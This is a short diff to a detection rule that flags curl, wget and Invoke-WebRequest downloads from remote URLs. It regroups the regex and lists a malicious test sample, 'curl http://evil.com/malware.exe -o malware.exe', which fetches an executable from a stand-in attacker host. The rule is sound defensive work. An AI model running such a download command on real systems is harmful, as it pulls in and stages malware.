@@ -4,7 +4,7 @@ description: >
   Detects general download commands (curl, wget, IWR) from remote URLs. Requires allowlisting for legitimate use.
 
 pattern: |
-  (?i)(curl|wget|invoke-webrequest|iwr).*(https?|ftp)://
+  (?i)((curl|wget|invoke-webrequest|iwr).*(https?|ftp)://)
 
 malicious:
   - "curl http://evil.com/malware.exe -o malware.exe"
